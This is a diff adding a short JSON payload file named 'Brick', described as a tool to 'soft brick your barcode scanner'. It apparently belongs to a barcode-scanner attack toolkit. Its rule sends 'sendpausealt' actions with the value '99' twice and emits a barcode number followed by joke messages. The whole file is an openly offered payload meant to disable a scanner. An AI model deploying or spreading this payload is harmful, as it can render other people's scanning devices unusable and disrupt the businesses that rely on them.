@@ -1,0 +1,24 @@
+{
+  "name": "Brick",
+  "description": "Soft brick your barcode scanner!",
+
+  "setup": {
+    "options": [],
+    "rules": [
+      {
+        "criteria": [
+        ],
+        "actions": [
+          ["sendpausealt", "99"],
+          ["sendpausealt", "99"]
+        ]
+      }
+    ]
+  },
+
+  "payload": [
+    "038000144158",
+    "please help",
+    "im trapped in a barcodefactory"
+  ]
+}
